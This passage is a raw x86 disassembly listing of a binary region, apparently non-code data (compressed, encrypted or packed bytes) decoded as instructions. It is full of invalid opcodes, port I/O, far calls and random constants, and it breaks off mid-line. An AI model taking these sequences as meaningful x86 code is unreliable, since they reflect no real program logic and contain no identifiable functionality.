  4226e6:	23 dc                	and    %esp,%ebx
  4226e8:	74 d3                	je     0x4226bd
  4226ea:	3c b6                	cmp    $0xb6,%al
  4226ec:	0a 63 af             	or     -0x51(%ebx),%ah
  4226ef:	0f c9                	bswap  %ecx
  4226f1:	7b 12                	jnp    0x422705
  4226f3:	09 20                	or     %esp,(%eax)
  4226f5:	3b 25 39 9b 17 53    	cmp    0x53179b39,%esp
  4226fb:	8b 06                	mov    (%esi),%eax
  4226fd:	31 e8                	xor    %ebp,%eax
  4226ff:	62 0a                	bound  %ecx,(%edx)
  422701:	09 fb                	or     %edi,%ebx
  422703:	73 e2                	jae    0x4226e7
  422705:	a0 ac 16 3b 82       	mov    0x823b16ac,%al
  42270a:	1b ee                	sbb    %esi,%ebp
  42270c:	d5 1d                	aad    $0x1d
  42270e:	82 54 84 e0 57       	adcb   $0x57,-0x20(%esp,%eax,4)
  422713:	78 b7                	js     0x4226cc
  422715:	c5 b3 e8 ba fa 37    	lds    0x37fabae8(%ebx),%esi
  42271b:	50                   	push   %eax
  42271c:	9d                   	popf
  42271d:	f8                   	clc
  42271e:	38 28                	cmp    %ch,(%eax)
  422720:	93                   	xchg   %eax,%ebx
  422721:	d0 8b 4d 93 56 28    	rorb   $1,0x2856934d(%ebx)
  422727:	4a                   	dec    %edx
  422728:	64 62 fd 26          	fs (bad) {bad}
  42272c:	a0 e9 cf c9 96       	mov    0x96c9cfe9,%al
  422731:	eb dd                	jmp    0x422710
  422733:	d7                   	xlat   %ds:(%ebx)
  422734:	53                   	push   %ebx
  422735:	3c e9                	cmp    $0xe9,%al
  422737:	19 2c 70             	sbb    %ebp,(%eax,%esi,2)
  42273a:	6c                   	insb   (%dx),%es:(%edi)
  42273b:	89 fa                	mov    %edi,%edx
  42273d:	5c                   	pop    %esp
  42273e:	b7 be                	mov    $0xbe,%bh
  422740:	f9                   	stc
  422741:	4e                   	dec    %esi
  422742:	5d                   	pop    %ebp
  422743:	61                   	popa
  422744:	cb                   	lret
  422745:	27                   	daa
  422746:	37                   	aaa
  422747:	fd                   	std
  422748:	14 a4                	adc    $0xa4,%al
  42274a:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  42274b:	ec                   	in     (%dx),%al
  42274c:	5a                   	pop    %edx
  42274d:	30 7e 11             	xor    %bh,0x11(%esi)
  422750:	d7                   	xlat   %ds:(%ebx)
  422751:	cc                   	int3
  422752:	05 a7 1e 94 37       	add    $0x37941ea7,%eax
  422757:	1b ec                	sbb    %esp,%ebp
  422759:	1c 6f                	sbb    $0x6f,%al
  42275b:	c0 9e 25 ab 19 dc 86 	rcrb   $0x86,-0x23e654db(%esi)
  422762:	09 7e 3e             	or     %edi,0x3e(%esi)
  422765:	df 6b c1             	fildll -0x3f(%ebx)
  422768:	34 f8                	xor    $0xf8,%al
  42276a:	7d 58                	jge    0x4227c4
  42276c:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  42276d:	c5 5f bd             	lds    -0x43(%edi),%ebx
  422770:	0c 15                	or     $0x15,%al
  422772:	d1 0e                	rorl   $1,(%esi)
  422774:	00 c2                	add    %al,%dl
  422776:	c3                   	ret
  422777:	37                   	aaa
  422778:	c0 1b a9             	rcrb   $0xa9,(%ebx)
  42277b:	88 6e 68             	mov    %ch,0x68(%esi)
  42277e:	ca 85 7d             	lret   $0x7d85
  422781:	e0 bd                	loopne 0x422740
  422783:	8b b1 b6 28 cb f1    	mov    -0xe34d74a(%ecx),%esi
  422789:	8a e2                	mov    %dl,%ah
  42278b:	d8 e1                	fsub   %st(1),%st
  42278d:	6a 56                	push   $0x56
  42278f:	75 14                	jne    0x4227a5
  422791:	88 91 0e 23 3b b6    	mov    %dl,-0x49c4dcf2(%ecx)
  422797:	9e                   	sahf
  422798:	73 dd                	jae    0x422777
  42279a:	ba a6 9d cc 45       	mov    $0x45cc9da6,%edx
  42279f:	d9 28                	fldcw  (%eax)
  4227a1:	9c                   	pushf
  4227a2:	5f                   	pop    %edi
  4227a3:	b2 a2                	mov    $0xa2,%dl
  4227a5:	76 1f                	jbe    0x4227c6
  4227a7:	43                   	inc    %ebx
  4227a8:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4227a9:	75 37                	jne    0x4227e2
  4227ab:	71 b6                	jno    0x422763
  4227ad:	b8 3a 21 6c a8       	mov    $0xa86c213a,%eax
  4227b2:	ce                   	into
  4227b3:	79 87                	jns    0x42273c
  4227b5:	0e                   	push   %cs
  4227b6:	ba a2 bc de 51       	mov    $0x51debca2,%edx
  4227bb:	7f 79                	jg     0x422836
  4227bd:	fc                   	cld
  4227be:	6a ed                	push   $0xffffffed
  4227c0:	13 59 a5             	adc    -0x5b(%ecx),%ebx
  4227c3:	bc 42 c5 03 f4       	mov    $0xf403c542,%esp
  4227c8:	a0 0f ca 42 c2       	mov    0xc242ca0f,%al
  4227cd:	17                   	pop    %ss
  4227ce:	ef                   	out    %eax,(%dx)
  4227cf:	33 1f                	xor    (%edi),%ebx
  4227d1:	f2 7d d8             	bnd jge 0x4227ac
  4227d4:	8f c0                	pop    %eax
  4227d6:	76 b5                	jbe    0x42278d
  4227d8:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4227d9:	7e 94                	jle    0x42276f
  4227db:	e7 98                	out    %eax,$0x98
  4227dd:	4b                   	dec    %ebx
  4227de:	83 47 aa 65          	addl   $0x65,-0x56(%edi)
  4227e2:	42                   	inc    %edx
  4227e3:	20 4a 7b             	and    %cl,0x7b(%edx)
  4227e6:	7b c1                	jnp    0x4227a9
  4227e8:	b2 d6                	mov    $0xd6,%dl
  4227ea:	bd 84 e6 c5 40       	mov    $0x40c5e684,%ebp
  4227ef:	7d 3b                	jge    0x42282c
  4227f1:	0b 60 9c             	or     -0x64(%eax),%esp
  4227f4:	6d                   	insl   (%dx),%es:(%edi)
  4227f5:	02 ed                	add    %ch,%ch
  4227f7:	e7 54                	out    %eax,$0x54
  4227f9:	4a                   	dec    %edx
  4227fa:	da 88 9f 05 54 37    	fimull 0x3754059f(%eax)
  422800:	9d                   	popf
  422801:	2d 60 cc 6e f3       	sub    $0xf36ecc60,%eax
  422806:	c4 bf e6 be b2 fa    	les    -0x54d411a(%edi),%edi
  42280c:	44                   	inc    %esp
  42280d:	9a 9c ab 58 97 79 64 	lcall  $0x6479,$0x9758ab9c
  422814:	18 58 f1             	sbb    %bl,-0xf(%eax)
  422817:	22 42 a2             	and    -0x5e(%edx),%al
  42281a:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  42281b:	61                   	popa
  42281c:	d3 eb                	shr    %cl,%ebx
  42281e:	b0 68                	mov    $0x68,%al
  422820:	12 09                	adc    (%ecx),%cl
  422822:	c1 b0 a8 97 3f fe d4 	shll   $0xd4,-0x1c06858(%eax)
  422829:	c9                   	leave
  42282a:	47                   	inc    %edi
  42282b:	17                   	pop    %ss
  42282c:	c6                   	(bad)
  42282d:	0a 39                	or     (%ecx),%bh
  42282f:	6a 84                	push   $0xffffff84
  422831:	51                   	push   %ecx
  422832:	71 47                	jno    0x42287b
  422834:	ac                   	lods   %ds:(%esi),%al
  422835:	30 2f                	xor    %ch,(%edi)
  422837:	96                   	xchg   %eax,%esi
  422838:	da c9                	fcmove %st(1),%st
  42283a:	41                   	inc    %ecx
  42283b:	b3 8e                	mov    $0x8e,%bl
  42283d:	45                   	inc    %ebp
  42283e:	7c 8f                	jl     0x4227cf
  422840:	64 95                	fs xchg %eax,%ebp
  422842:	85 ad 32 54 97 fc    	test   %ebp,-0x368abce(%ebp)
  422848:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  422849:	d5 5d                	aad    $0x5d
  42284b:	19 ee                	sbb    %ebp,%esi
  42284d:	b9 cf 86 a2 5e       	mov    $0x5ea286cf,%ecx
  422852:	c1 7f c6 f7          	sarl   $0xf7,-0x3a(%edi)
  422856:	43                   	inc    %ebx
  422857:	64 6c                	fs insb (%dx),%es:(%edi)
  422859:	2b e4                	sub    %esp,%esp
  42285b:	11 9e a9 62 fa ac    	adc    %ebx,-0x53059d57(%esi)
  422861:	42                   	inc    %edx
  422862:	21 ef                	and    %ebp,%edi
  422864:	02 b3 07 08 90 b4    	add    -0x4b6ff7f9(%ebx),%dh
  42286a:	ad                   	lods   %ds:(%esi),%eax
  42286b:	28 82 39 54 83 db    	sub    %al,-0x247cabc7(%edx)
  422871:	66 2a 92 42 c4 43 33 	data16 sub 0x3343c442(%edx),%dl
  422878:	6e                   	outsb  %ds:(%esi),(%dx)
  422879:	23 75 a8             	and    -0x58(%ebp),%esi
  42287c:	95                   	xchg   %eax,%ebp
  42287d:	70 be                	jo     0x42283d
  42287f:	18 06                	sbb    %al,(%esi)
  422881:	a9 a4 26 a4 2b       	test   $0x2ba426a4,%eax
  422886:	8b 76 e6             	mov    -0x1a(%esi),%esi
  422889:	f6 36                	divb   (%esi)
  42288b:	60                   	pusha
  42288c:	df a5 25 e5 50 5f    	fbld   0x5f50e525(%ebp)
  422892:	28 ba a2 06 2d 10    	sub    %bh,0x102d06a2(%edx)
  422898:	9c                   	pushf
  422899:	cd 71                	int    $0x71
  42289b:	2d 37 cf 46 a8       	sub    $0xa846cf37,%eax
  4228a0:	87 60 b2             	xchg   %esp,-0x4e(%eax)
  4228a3:	db c3                	fcmovnb %st(3),%st
  4228a5:	2b f9                	sub    %ecx,%edi
  4228a7:	44                   	inc    %esp
  4228a8:	58                   	pop    %eax
  4228a9:	08 e5                	or     %ah,%ch
  4228ab:	9b                   	fwait
  4228ac:	59                   	pop    %ecx
  4228ad:	38 9a e8 13 34 9a    	cmp    %bl,-0x65cbec18(%edx)
  4228b3:	ca 01 51             	lret   $0x5101
  4228b6:	43                   	inc    %ebx
  4228b7:	9f                   	lahf
  4228b8:	2c 44                	sub    $0x44,%al
  4228ba:	39 8c 4b bc e7 c7 20 	cmp    %ecx,0x20c7e7bc(%ebx,%ecx,2)
  4228c1:	bd 08 bc 9f bb       	mov    $0xbb9fbc08,%ebp
  4228c6:	06                   	push   %es
  4228c7:	47                   	inc    %edi
  4228c8:	89 22                	mov    %esp,(%edx)
  4228ca:	70 0e                	jo     0x4228da
  4228cc:	fb                   	sti
  4228cd:	2d 62 b0 d1 50       	sub    $0x50d1b062,%eax
  4228d2:	a8 54                	test   $0x54,%al
  4228d4:	03 ab ba bf 35 92    	add    -0x6dca4046(%ebx),%ebp
  4228da:	cc                   	int3
  4228db:	e6 a7                	out    %al,$0xa7
  4228dd:	fa                   	cli
  4228de:	1e                   	push   %ds
  4228df:	c9                   	leave
  4228e0:	f0 79 b4             	lock jns 0x422897
  4228e3:	64 3f                	fs aas
  4228e5:	40                   	inc    %eax
  4228e6:	86 6f 09             	xchg   %ch,0x9(%edi)
  4228e9:	0b 90 56 1b 52 e2    	or     -0x1dade4aa(%eax),%edx
  4228ef:	98                   	cwtl
  4228f0:	6b 3b 35             	imul   $0x35,(%ebx),%edi
  4228f3:	06                   	push   %es
  4228f4:	aa                   	stos   %al,%es:(%edi)
  4228f5:	3d 37 db 4c 34       	cmp    $0x344cdb37,%eax
  4228fa:	e4 d3                	in     $0xd3,%al
  4228fc:	77 dd                	ja     0x4228db
  4228fe:	f6 0c f9 99          	testb  $0x99,(%ecx,%edi,8)
  422902:	6f                   	outsl  %ds:(%esi),(%dx)
  422903:	e7 72                	out    %eax,$0x72
  422905:	a1 4d 27 61 9a       	mov    0x9a61274d,%eax
  42290a:	69 63 b6 d9 ca df f4 	imul   $0xf4dfcad9,-0x4a(%ebx),%esp
  422911:	29 21                	sub    %esp,(%ecx)
  422913:	d2 90 00 53 2b 29    	rclb   %cl,0x292b5300(%eax)
  422919:	3e 49                	ds dec %ecx
  42291b:	cf                   	iret
  42291c:	fe 4f 92             	decb   -0x6e(%edi)
  42291f:	43                   	inc    %ebx
  422920:	16                   	push   %ss
  422921:	39 dd                	cmp    %ebx,%ebp
  422923:	8e d2                	mov    %edx,%ss
  422925:	40                   	inc    %eax
  422926:	9b                   	fwait
  422927:	75 dd                	jne    0x422906
  422929:	a1 43 07 06 26       	mov    0x26060743,%eax
  42292e:	f5                   	cmc
  42292f:	2e 38 b9 78 00 90 e5 	cmp    %bh,%cs:-0x1a6fff88(%ecx)
  422936:	a3 d3 95 45 b3       	mov    %eax,0xb34595d3
  42293b:	38 87 9e bf 42 40    	cmp    %al,0x4042bf9e(%edi)
  422941:	ff 30                	push   (%eax)
  422943:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  422944:	24 19                	and    $0x19,%al
  422946:	eb db                	jmp    0x422923
  422948:	2e 20 1d 93 73 02 91 	and    %bl,%cs:0x91027393
  42294f:	cb                   	lret
  422950:	88 47 c8             	mov    %al,-0x38(%edi)
  422953:	47                   	inc    %edi
  422954:	48                   	dec    %eax
  422955:	3b 86 80 4c 45 ac    	cmp    -0x53bab380(%esi),%eax
  42295b:	b9 00 2f 57 78       	mov    $0x78572f00,%ecx
  422960:	9a 76 49 5d 4b 18 b7 	lcall  $0xb718,$0x4b5d4976
  422967:	e1 f4                	loope  0x42295d
  422969:	a3 e4 5d 82 00       	mov    %eax,0x825de4
  42296e:	16                   	push   %ss
  42296f:	76 6c                	jbe    0x4229dd
  422971:	eb 91                	jmp    0x422904
  422973:	c9                   	leave
  422974:	83 bb d5 21 3c fe ff 	cmpl   $0xffffffff,-0x1c3de2b(%ebx)
  42297b:	48                   	dec    %eax
  42297c:	2e d5 2e             	cs aad $0x2e
  42297f:	1a 28                	sbb    (%eax),%ch
  422981:	8f                   	(bad)
  422982:	d9 2b                	fldcw  (%ebx)
  422984:	db 5f 25             	fistpl 0x25(%edi)
  422987:	05 f2 b6 fd 20       	add    $0x20fdb6f2,%eax
  42298c:	76 47                	jbe    0x4229d5
  42298e:	aa                   	stos   %al,%es:(%edi)
  42298f:	be c2 ef e1 69       	mov    $0x69e1efc2,%esi
  422994:	d0 86 13 59 69 1c    	rolb   $1,0x1c695913(%esi)
  42299a:	dd ed                	fucomp %st(5)
  42299c:	be 3b fe 21 88       	mov    $0x8821fe3b,%esi
  4229a1:	04 e0                	add    $0xe0,%al
  4229a3:	7a 20                	jp     0x4229c5
  4229a5:	ee                   	out    %al,(%dx)
  4229a6:	5b                   	pop    %ebx
  4229a7:	2f                   	das
  4229a8:	c9                   	leave
  4229a9:	b4 4f                	mov    $0x4f,%ah
  4229ab:	e9 c6 ef 35 80       	jmp    0x80781976
  4229b0:	f8                   	clc
  4229b1:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4229b2:	34 1e                	xor    $0x1e,%al
  4229b4:	ae                   	scas   %es:(%edi),%al
  4229b5:	4e                   	dec    %esi
  4229b6:	63 41 59             	arpl   %eax,0x59(%ecx)
  4229b9:	23 b7 fa 4b 7c 1b    	and    0x1b7c4bfa(%edi),%esi
  4229bf:	2c 00                	sub    $0x0,%al
  4229c1:	fd                   	std
  4229c2:	fc                   	cld
  4229c3:	82 ab 1f 38 7a e4 d6 	subb   $0xd6,-0x1b85c7e1(%ebx)
  4229ca:	09 55 96             	or     %edx,-0x6a(%ebp)
  4229cd:	e0 fa                	loopne 0x4229c9
  4229cf:	58                   	pop    %eax
  4229d0:	59                   	pop    %ecx
  4229d1:	aa                   	stos   %al,%es:(%edi)
  4229d2:	33 c6                	xor    %esi,%eax
  4229d4:	8a 4b 6a             	mov    0x6a(%ebx),%cl
  4229d7:	92                   	xchg   %eax,%edx
  4229d8:	7c 8f                	jl     0x422969
  4229da:	f0 3b 69 64          	lock cmp 0x64(%ecx),%ebp
  4229de:	e7 19                	out    %eax,$0x19
  4229e0:	0c 20                	or     $0x20,%al
  4229e2:	19 2d 97 0d c2 02    	sbb    %ebp,0x2c20d97
  4229e8:	44                   	inc    %esp
  4229e9:	ce                   	into
  4229ea:	e0 2b                	loopne 0x422a17
  4229ec:	8c cc                	mov    %cs,%esp
  4229ee:	4a                   	dec    %edx
  4229ef:	72 18                	jb     0x422a09
  4229f1:	f1                   	int1
  4229f2:	7d ad                	jge    0x4229a1
  4229f4:	7a 7e                	jp     0x422a74
  4229f6:	56                   	push   %esi
  4229f7:	e4 30                	in     $0x30,%al
  4229f9:	34 95                	xor    $0x95,%al
  4229fb:	2f                   	das
  4229fc:	86 61 77             	xchg   %ah,0x77(%ecx)
  4229ff:	1c f5                	sbb    $0xf5,%al
  422a01:	e3 56                	jecxz  0x422a59
  422a03:	57                   	push   %edi
  422a04:	42                   	inc    %edx
  422a05:	99                   	cltd
  422a06:	36 3a c0             	ss cmp %al,%al
  422a09:	40                   	inc    %eax
  422a0a:	6e                   	outsb  %ds:(%esi),(%dx)
  422a0b:	8d 26                	lea    (%esi),%esp
  422a0d:	e2 bf                	loop   0x4229ce
  422a0f:	78 3d                	js     0x422a4e
  422a11:	bd 2c a5 37 9a       	mov    $0x9a37a52c,%ebp
  422a16:	42                   	inc    %edx
  422a17:	d6                   	salc
  422a18:	46                   	inc    %esi
  422a19:	2d af 97 13 03       	sub    $0x31397af,%eax
  422a1e:	13 15 5b a3 32 b9    	adc    0xb932a35b,%edx
  422a24:	92                   	xchg   %eax,%edx
  422a25:	74 66                	je     0x422a8d
  422a27:	61                   	popa
  422a28:	58                   	pop    %eax
  422a29:	2c 0d                	sub    $0xd,%al
  422a2b:	bd 33 39 7a a3       	mov    $0xa37a3933,%ebp
  422a30:	4c                   	dec    %esp
  422a31:	04 b1                	add    $0xb1,%al
  422a33:	e0 ef                	loopne 0x422a24
  422a35:	f1                   	int1
  422a36:	3b 50 dc             	cmp    -0x24(%eax),%edx
  422a39:	74 6f                	je     0x422aaa
  422a3b:	ae                   	scas   %es:(%edi),%al
  422a3c:	2e a3 02 5f 62 69    	mov    %eax,%cs:0x69625f02
  422a42:	48                   	dec    %eax
  422a43:	b4 72                	mov    $0x72,%ah
  422a45:	4d                   	dec    %ebp
  422a46:	bf 5c e4 a6 a8       	mov    $0xa8a6e45c,%edi
  422a4b:	62 07                	bound  %eax,(%edi)
  422a4d:	ce                   	into
  422a4e:	67 5a                	addr16 pop %edx
  422a50:	08 2a                	or     %ch,(%edx)
  422a52:	8b 39                	mov    (%ecx),%edi
  422a54:	da 2a                	fisubrl (%edx)
  422a56:	8e b7 21 b3 a8 bc    	mov    -0x43574cdf(%edi),%?
  422a5c:	53                   	push   %ebx
  422a5d:	b8 da 25 5d 01       	mov    $0x15d25da,%eax
  422a62:	c4 22                	les    (%edx),%esp
  422a64:	4f                   	dec    %edi
  422a65:	34 61                	xor    $0x61,%al
  422a67:	cc                   	int3
  422a68:	1e                   	push   %ds
  422a69:	e0 97                	loopne 0x422a02
  422a6b:	17                   	pop    %ss
  422a6c:	2c 0b                	sub    $0xb,%al
  422a6e:	45                   	inc    %ebp
  422a6f:	3f                   	aas
  422a70:	b2 52                	mov    $0x52,%dl
  422a72:	2b 46 80             	sub    -0x80(%esi),%eax
  422a75:	75 1d                	jne    0x422a94
  422a77:	7e bb                	jle    0x422a34
  422a79:	79 d6                	jns    0x422a51
  422a7b:	31 3d 3e b5 5a bf    	xor    %edi,0xbf5ab53e
  422a81:	46                   	inc    %esi
  422a82:	d7                   	xlat   %ds:(%ebx)
  422a83:	4e                   	dec    %esi
  422a84:	32 fc                	xor    %ah,%bh
  422a86:	4e                   	dec    %esi
  422a87:	ea 73 2a ef a8 62 cb 	ljmp   $0xcb62,$0xa8ef2a73
  422a8e:	df e8                	fucomip %st(0),%st
  422a90:	61                   	popa
  422a91:	f1                   	int1
  422a92:	7c 12                	jl     0x422aa6
  422a94:	d7                   	xlat   %ds:(%ebx)
  422a95:	4e                   	dec    %esi
  422a96:	1c 2a                	sbb    $0x2a,%al
  422a98:	85 54 00 76          	test   %edx,0x76(%eax,%eax,1)
  422a9c:	01 65 25             	add    %esp,0x25(%ebp)
  422a9f:	97                   	xchg   %eax,%edi
  422aa0:	be 8d 6c c7 af       	mov    $0xafc76c8d,%esi
  422aa5:	c2 c4 f7             	ret    $0xf7c4
  422aa8:	d1 e8                	shr    $1,%eax
  422aaa:	79 e0                	jns    0x422a8c
  422aac:	c5 1e                	lds    (%esi),%ebx
  422aae:	5c                   	pop    %esp
  422aaf:	1d f7 3b 7f 4f       	sbb    $0x4f7f3bf7,%eax
  422ab4:	8a 27                	mov    (%edi),%ah
  422ab6:	37                   	aaa
  422ab7:	53                   	push   %ebx
  422ab8:	6d                   	insl   (%dx),%es:(%edi)
  422ab9:	7e da                	jle    0x422a95
  422abb:	f7 27                	mull   (%edi)
  422abd:	b7 93                	mov    $0x93,%bh
  422abf:	84 60 b0             	test   %ah,-0x50(%eax)
  422ac2:	c4 8c e5 e8 bb 0e 61 	les    0x610ebbe8(%ebp,%eiz,8),%ecx
  422ac9:	74 44                	je     0x422b0f
  422acb:	52                   	push   %edx
  422acc:	46                   	inc    %esi
  422acd:	2f                   	das
  422ace:	ce                   	into
  422acf:	df 43 06             	filds  0x6(%ebx)
  422ad2:	a1 67 5d fd f6       	mov    0xf6fd5d67,%eax
  422ad7:	b6 7c                	mov    $0x7c,%dh
  422ad9:	98                   	cwtl
  422ada:	72 d5                	jb     0x422ab1
  422adc:	8a c8                	mov    %al,%cl
  422ade:	52                   	push   %edx
  422adf:	9d                   	popf
  422ae0:	8e 79 2c             	mov    0x2c(%ecx),%?
  422ae3:	1e                   	push   %ds
  422ae4:	1d 3b 2f 6b bc       	sbb    $0xbc6b2f3b,%eax
  422ae9:	59                   	pop    %ecx
  422aea:	28 79 a2             	sub    %bh,-0x5e(%ecx)
  422aed:	fa                   	cli
  422aee:	25 f1 ba 8e 5d       	and    $0x5d8ebaf1,%eax
  422af3:	af                   	scas   %es:(%edi),%eax
  422af4:	cf                   	iret
  422af5:	c6                   	(bad)
  422af6:	23 5c cb 8f          	and    -0x71(%ebx,%ecx,8),%ebx
  422afa:	51                   	push   %ecx
  422afb:	19 e2                	sbb    %esp,%edx
  422afd:	0d 73 30 fd 07       	or     $0x7fd3073,%eax
  422b02:	c3                   	ret
  422b03:	3d 33 1a a1 06       	cmp    $0x6a11a33,%eax
  422b08:	27                   	daa
  422b09:	6d                   	insl   (%dx),%es:(%edi)
  422b0a:	cd 14                	int    $0x14
  422b0c:	22 a9 53 ad 0c 1e    	and    0x1e0cad53(%ecx),%ch
  422b12:	d5 a7                	aad    $0xa7
  422b14:	2a 1d d6 a1 5f 24    	sub    0x245fa1d6,%bl
  422b1a:	80 53 c1 19          	adcb   $0x19,-0x3f(%ebx)
  422b1e:	84 a8 01 09 01 0a    	test   %ch,0xa010901(%eax)
  422b24:	03 a5 17 a1 96 db    	add    -0x24695ee9(%ebp),%esp
  422b2a:	01 e1                	add    %esp,%ecx
  422b2c:	19 e1                	sbb    %esp,%ecx
  422b2e:	3a e5                	cmp    %ch,%ah
  422b30:	d8 6c 4a 59          	fsubrs 0x59(%edx,%ecx,2)
  422b34:	89 ba 2f 5d cf 7b    	mov    %edi,0x7bcf5d2f(%edx)
  422b3a:	7d 6a                	jge    0x422ba6
  422b3c:	c0 93 e9 01 b0 c8 1b 	rclb   $0x1b,-0x374ffe17(%ebx)
  422b43:	ef                   	out    %eax,(%dx)
  422b44:	0d b9 e8 84 84       	or     $0x8484e8b9,%eax
  422b49:	03 03                	add    (%ebx),%eax
  422b4b:	87 62 1a             	xchg   %esp,0x1a(%edx)
  422b4e:	83 2b 07             	subl   $0x7,(%ebx)
  422b51:	57                   	push   %edi
  422b52:	e1 32                	loope  0x422b86
  422b54:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  422b55:	4a                   	dec    %edx
  422b56:	c2 4d 5d             	ret    $0x5d4d
  422b59:	b5 ac                	mov    $0xac,%ch
  422b5b:	a8 5b                	test   $0x5b,%al
  422b5d:	bf 83 5f 8b 8c       	mov    $0x8c8b5f83,%edi
  422b62:	1d 97 38 36 8a       	sbb    $0x8a363897,%eax
  422b67:	11 75 39             	adc    %esi,0x39(%ebp)
  422b6a:	f9                   	stc
  422b6b:	a9 43 51 0d 60       	test   $0x600d5143,%eax
  422b70:	8a 0f                	mov    (%edi),%cl
  422b72:	61                   	popa
  422b73:	d3 c8                	ror    %cl,%eax
  422b75:	bb dc a2 bd c1       	mov    $0xc1bda2dc,%ebx
  422b7a:	01 f3                	add    %esi,%ebx
  422b7c:	a3 75 57 49 3c       	mov    %eax,0x3c495775
  422b81:	08 24 77             	or     %ah,(%edi,%esi,2)
  422b84:	aa                   	stos   %al,%es:(%edi)
  422b85:	88 29                	mov    %ch,(%ecx)
  422b87:	70 ca                	jo     0x422b53
  422b89:	7c 7c                	jl     0x422c07
  422b8b:	81 e6 bc 66 b2 ff    	and    $0xffb266bc,%esi
  422b91:	8c 67 53             	mov    %fs,0x53(%edi)
  422b94:	68 eb 25 89 21       	push   $0x218925eb
  422b99:	0e                   	push   %cs
  422b9a:	cf                   	iret
  422b9b:	0d 5c 1d f6 19       	or     $0x19f61d5c,%eax
  422ba0:	ea 73 eb 72 db 21 fe 	ljmp   $0xfe21,$0xdb72eb73
  422ba7:	82 50 58 89          	adcb   $0x89,0x58(%eax)
  422bab:	c5 db d8             	(bad)
  422bae:	06                   	push   %es
  422baf:	bb 48 e4 f8 19       	mov    $0x19f8e448,%ebx
  422bb4:	7e 01                	jle    0x422bb7
  422bb6:	d1 17                	rcll   $1,(%edi)
  422bb8:	dc 09                	fmull  (%ecx)
  422bba:	58                   	pop    %eax
  422bbb:	01 64 35 17          	add    %esp,0x17(%ebp,%esi,1)
  422bbf:	42                   	inc    %edx
  422bc0:	f3 fa                	repz cli
  422bc2:	46                   	inc    %esi
  422bc3:	fe 08                	decb   (%eax)
  422bc5:	93                   	xchg   %eax,%ebx
  422bc6:	69 dc 5d 85 7c f9    	imul   $0xf97c855d,%esp,%ebx
  422bcc:	88 69 4d             	mov    %ch,0x4d(%ecx)
  422bcf:	13 63 26             	adc    0x26(%ebx),%esp
  422bd2:	44                   	inc    %esp
  422bd3:	e7 8b                	out    %eax,$0x8b
  422bd5:	26 0c 3d             	es or  $0x3d,%al
  422bd8:	79 2e                	jns    0x422c08
  422bda:	e1 f0                	loope  0x422bcc
  422bdc:	01 90 82 a5 04 df    	add    %edx,-0x20fb5a7e(%eax)
  422be2:	ab                   	stos   %eax,%es:(%edi)
  422be3:	db a2 9f 24 14 03    	(bad) 0x314249f(%edx)
  422be9:	01 a9 31 05 29 de    	add    %ebp,-0x21d6facf(%ecx)
  422bef:	d2 4a 1a             	rorb   %cl,0x1a(%edx)
  422bf2:	21 06                	and    %eax,(%esi)
  422bf4:	6c                   	insb   (%dx),%es:(%edi)
  422bf5:	9a cd bb ba 34 87 b8 	lcall  $0xb887,$0x34babbcd
  422bfc:	0b ca                	or     %edx,%ecx
  422bfe:	92                   	xchg   %eax,%edx
  422bff:	b5 10                	mov    $0x10,%ch
  422c01:	81 02 79 9f 89 1b    	addl   $0x1b899f79,(%edx)
  422c07:	2a a5 2f c0 33 e4    	sub    -0x1bcc3fd1(%ebp),%ah
  422c0d:	46                   	inc    %esi
  422c0e:	2a 18                	sub    (%eax),%bl
  422c10:	b0 e7                	mov    $0xe7,%al
  422c12:	72 ce                	jb     0x422be2
  422c14:	2e 95                	cs xchg %eax,%ebp
  422c16:	01 e1                	add    %esp,%ecx
  422c18:	c5 e1 d8 f3          	vpsubusb %xmm3,%xmm3,%xmm6
  422c1c:	c5 58 17             	lds    0x17(%eax),%ebx
  422c1f:	e2 92                	loop   0x422bb3
  422c21:	13 60 40             	adc    0x40(%eax),%esp
  422c24:	59                   	pop    %ecx
  422c25:	6a 8e                	push   $0xffffff8e
  422c27:	1c 51                	sbb    $0x51,%al
  422c29:	f7 d3                	not    %ebx
  422c2b:	b8 45 bf bc 73       	mov    $0x73bcbf45,%eax
  422c30:	19 cd                	sbb    %ecx,%ebp
  422c32:	b5 e7                	mov    $0xe7,%ch
  422c34:	9c                   	pushf
  422c35:	92                   	xchg   %eax,%edx
  422c36:	3d 6e 3d 17 4a       	cmp    $0x4a173d6e,%eax
  422c3b:	28 4f 50             	sub    %cl,0x50(%edi)
  422c3e:	eb 49                	jmp    0x422c89
  422c40:	42                   	inc    %edx
  422c41:	7f f8                	jg     0x422c3b
  422c43:	14 60                	adc    $0x60,%al
  422c45:	90                   	nop
  422c46:	9a 1c 04 f7 6d e8 99 	lcall  $0x99e8,$0x6df7041c
  422c4d:	fa                   	cli
  422c4e:	d2 f4                	shl    %cl,%ah
  422c50:	13 50 13             	adc    0x13(%eax),%edx
  422c53:	13 bb 24 23 07 78    	adc    0x78072324(%ebx),%edi
  422c59:	fb                   	sti
  422c5a:	45                   	inc    %ebp
  422c5b:	ff af 67 03 e8 95    	ljmp   *-0x6a17fc99(%edi)
  422c61:	d1 09                	rorl   $1,(%ecx)
  422c63:	ad                   	lods   %ds:(%esi),%eax
  422c64:	c7 42 7a e9 f1 cb f6 	movl   $0xf6cbf1e9,0x7a(%edx)
  422c6b:	53                   	push   %ebx
  422c6c:	fe                   	(bad)
  422c6d:	5f                   	pop    %edi
  422c6e:	ff                   	(bad)
  422c6f:	ba 47 83 e5 f5       	mov    $0xf5e58347,%edx
  422c74:	58                   	pop    %eax
  422c75:	b2 d2                	mov    $0xd2,%dl
  422c77:	ff 0b                	decl   (%ebx)
  422c79:	8b bc 09 3a 85 a8 dd 	mov    -0x22577ac6(%ecx,%ecx,1),%edi
  422c80:	13 dc                	adc    %esp,%ebx
  422c82:	a9 e4 57 8a e4       	test   $0xe48a57e4,%eax
  422c87:	03 4e 2b             	add    0x2b(%esi),%ecx
  422c8a:	fe 4e 16             	decb   0x16(%esi)
  422c8d:	b8 f0 11 5c 65       	mov    $0x655c11f0,%eax
  422c92:	f3 81 93 b6 cc d2 91 	repz adcl $0x938f2295,-0x6e2d334a(%ebx)
  422c99:	95 22 8f 93 
